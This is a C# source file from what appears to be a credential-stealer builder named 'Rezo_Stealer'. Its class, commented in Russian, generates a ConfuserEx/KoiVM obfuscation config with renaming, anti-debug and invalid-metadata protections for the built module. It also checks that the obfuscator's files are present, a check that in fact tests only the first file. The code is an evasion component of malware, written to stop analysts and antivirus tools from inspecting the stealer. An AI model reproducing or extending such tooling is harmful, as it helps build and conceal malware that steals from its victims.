using System;
using System.IO;
using System.Text;

namespace Rezo_Stealer.Dark
{
    public static class Obfuscation
    {
        /// <summary>
        /// Метод для записи параметров для обфускации модуля
        /// </summary>
        /// <param name="modulename">Имя файла для обфускации</param>
        /// <returns>Готовый скрипт для запуска шифрования</returns>
        public static string TempConfig(string modulename)
        {
            string fail = string.Empty;
            var darkbuild = new StringBuilder();
            darkbuild.AppendLine("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
            darkbuild.AppendLine($@"<project outputDir=""Obfuscated"" baseDir=""{GlobalPath.PathDark}"" xmlns=""http://confuser.codeplex.com"">");
            darkbuild.AppendLine("    <rule pattern=\"true\" inherit=\"false\">");
            //  darkbuild.AppendLine("      <protection id=\"virt\" />");
            darkbuild.AppendLine("      <protection id=\"rename\" />");
            darkbuild.AppendLine("      <protection id=\"checksum\" />");
            darkbuild.AppendLine("      <protection id=\"Clean ref proxy\" />");
            darkbuild.AppendLine("      <protection id=\"Rename Module\" />");
            darkbuild.AppendLine("      <protection id=\"anti debug\" />");
            darkbuild.AppendLine("      <protection id=\"invalid metadata\" />");
            //   darkbuild.AppendLine("      <protection id=\"resources\" />");
            darkbuild.AppendLine("    </rule>");
            darkbuild.AppendLine($"    <module path=\"{modulename}\" />");
            darkbuild.AppendLine("    <plugin>KoiVM.Confuser.exe</plugin>");
            darkbuild.AppendLine("</project>");
            return darkbuild.Length > 0 ? darkbuild.ToString() : fail;
        }

        /// <summary>
        /// Массив имён файлов для проверки на существование
        /// </summary>
        private static string[] DarkFiles
        {
            get
            {
                string[] files = new[]
                {
                   "Colorful.Console.dll", "Confuser.Core.dll",
                   "Confuser.Protections.dll", "Confuser.Runtime.dll",
                   "KoiVM.Confuser.exe", "KoiVM.Runtime.dll",
                   "Confuser.CLI.exe", "Confuser.DynCipher.dll",
                   "Confuser.Renamer.dll", "dnlib.dll",
                   "KoiVM.dll",
                };
                return files;
            }
        }

        /// <summary>
        /// Метод для проверки файлов DarkVM
        /// </summary>
        /// <returns>true/false</returns>
        public static bool Checker()
        {
            // Проверяем директорию с обфускатором
            if (Directory.Exists(GlobalPath.PathDark))
            {
                // Проходимся по циклу для получения имени файлов
                foreach (string ff in DarkFiles)
                {
                    // Проверяем все файлы в папке Dark
                    return File.Exists(Path.Combine(GlobalPath.PathDark, ff));
                }
            }
            else
            {
                File.WriteAllText("ErrorRun.txt", $"Не найдены компоненты из папки Dark:  {GlobalPath.PathDark}{Environment.NewLine}");
            }
            return false;
        }
    }
}